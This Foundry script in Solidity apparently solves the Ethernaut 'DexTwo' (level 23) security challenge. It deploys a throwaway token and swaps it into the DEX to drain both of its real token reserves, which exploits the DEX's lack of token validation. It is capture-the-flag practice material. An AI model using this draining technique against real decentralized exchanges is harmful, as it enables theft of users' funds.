//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {DexTwo}  from "src/ethernaut23.sol";
import {console} from "lib/forge-std/src/console.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {vkToken} from "src/vkToken.sol";

contract ethernaut23Script is Script{
    DexTwo instance = DexTwo(payable(0xaD86f3d020dEDcB09bed7C19B58836780B169604));   
    address private tokenA = address(instance.token1());
    address private tokenB = address(instance.token2());
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        //creating my custom token
        vkToken token = new vkToken(100);
        token.approve(address(instance),100); //allowing to spend
        token.transfer(address(instance),1);   // trnafering 1 tokeen to dex

        instance.approve(address(instance),1000);

        instance.swap(address(token),tokenA,1);
        console.log("Dex Token A: 1st wave ", IERC20(tokenA).balanceOf(address(instance)));
        console.log("Dex Token B: 1st wave ", IERC20(tokenB).balanceOf(address(instance)));
        console.log("dex toekn vk:1st wave ", IERC20(token).balanceOf(address(instance)));

        instance.swap(address(token),tokenB,2);

        address wallet = vm.addr(vm.envUint("PRIVATE_KEY"));

        console.log("Wallet Token A:", IERC20(tokenA).balanceOf(wallet));
        console.log("Wallet Token B:", IERC20(tokenB).balanceOf(wallet));
        console.log("wallet vkToken balance:", IERC20(token).balanceOf(wallet));

        console.log("Dex Token A:", IERC20(tokenA).balanceOf(address(instance)));
        console.log("Dex Token B:", IERC20(tokenB).balanceOf(address(instance)));
        console.log("dex toekn vk: ", IERC20(token).balanceOf(address(instance)));

        vm.stopBroadcast();
    }
}

